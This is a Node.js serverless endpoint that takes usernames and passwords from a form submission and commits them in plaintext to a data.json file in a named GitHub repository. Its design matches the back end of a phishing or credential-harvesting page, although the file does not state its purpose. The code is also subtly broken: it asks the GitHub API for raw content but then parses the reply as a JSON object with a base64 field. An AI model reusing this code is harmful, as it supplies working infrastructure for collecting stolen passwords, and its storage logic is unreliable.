// api/submit.js

const fetch = require('node-fetch');

module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        res.status(405).json({ message: 'Only POST requests are allowed.' });
        return;
    }

    const { password, username } = req.body;

    if (!username) {
        res.status(400).json({ message: 'Username field is required.' });
        return;
    }

    // Prepare the data to append
    const newEntry = {
        timestamp: new Date().toISOString(),
        username: username,
        password: password || 'N/A',
    };

    // GitHub repository details
    const owner = 'pokgai1234';
    const repo = 'sjac';
    const path = 'data.json'; // File to store data

    // GitHub API URL
    const url = `https://api.github.com/repos/${owner}/${repo}/contents/${path}`;

    // Fetch the existing file
    const response = await fetch(url, {
        headers: {
            'Authorization': `token ${process.env.GITHUB_TOKEN}`,
            'Accept': 'application/vnd.github.v3.raw',
        },
    });

    let content = [];
    let sha = '';

    if (response.status === 200) {
        const fileData = await response.json();
        content = JSON.parse(Buffer.from(fileData.content, 'base64').toString());
        sha = fileData.sha;
    } else if (response.status === 404) {
        // File doesn't exist, will create a new one
        content = [];
    } else {
        res.status(500).json({ message: 'Error fetching the data file.' });
        return;
    }

    // Append the new entry
    content.push(newEntry);

    // Encode the updated content
    const updatedContent = Buffer.from(JSON.stringify(content, null, 2)).toString('base64');

    // Commit message
    const message = 'Add new form submission';

    // Prepare the payload
    const payload = {
        message: message,
        content: updatedContent,
    };

    if (sha) {
        payload.sha = sha;
    }

    // Update or create the file
    const updateResponse = await fetch(url, {
        method: 'PUT',
        headers: {
            'Authorization': `token ${process.env.GITHUB_TOKEN}`,
            'Accept': 'application/vnd.github.v3+json',
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
    });

    if (updateResponse.status === 201 || updateResponse.status === 200) {
        // Redirect to thank you page
        res.status(200).json({ message: 'Data received successfully!' });
    } else {
        const errorData = await updateResponse.json();
        res.status(500).json({ message: 'Error saving data.', error: errorData });
    }
};
